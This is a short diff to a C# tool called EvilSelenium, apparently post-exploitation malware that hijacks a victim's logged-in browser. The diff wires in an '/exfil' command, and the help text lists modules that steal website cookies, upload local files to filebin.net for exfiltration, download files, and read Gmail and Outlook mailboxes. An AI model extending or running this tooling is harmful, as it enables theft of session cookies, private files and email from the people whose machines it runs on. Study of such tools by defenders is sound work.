@@ -115,6 +115,10 @@ namespace EvilSelenium
                     {
                         Downloader.DownloadFile(args[1],args[2]);
                     }
+                    else if (args[0] == "/exfil")
+                    {
+                        Exfil.ExfilData(args[1], args[2]);
+                    }
                     else if (args[0] == "/gmail")
                     {
                         ExtractMail.GmailReader(args[1],args[2]);
@@ -171,7 +175,7 @@ namespace EvilSelenium
     /cookies [website] - Grabs cookies for a given website.
 
     MODULES:
-    /download [file_url] [seconds] - Downloads a file and specify time to wait for download to finish. File extensions should not be executable.
+    /download [file_url] [seconds] - Downloads a file to the default downloads folder. Specify time to wait for download to finish. File extensions should not be executable.
     /exfil [local_file] [seconds] - Uploads a file on filebin.net and outputs the download link.
     /gmail [out_path] [num_of_emails] - Fetches emails from mail.google.com if user is authenticated. Max 50 emails.
     /outlook [out_path] [num_of_emails] - Fetches emails from Outlook if user is authenticated.
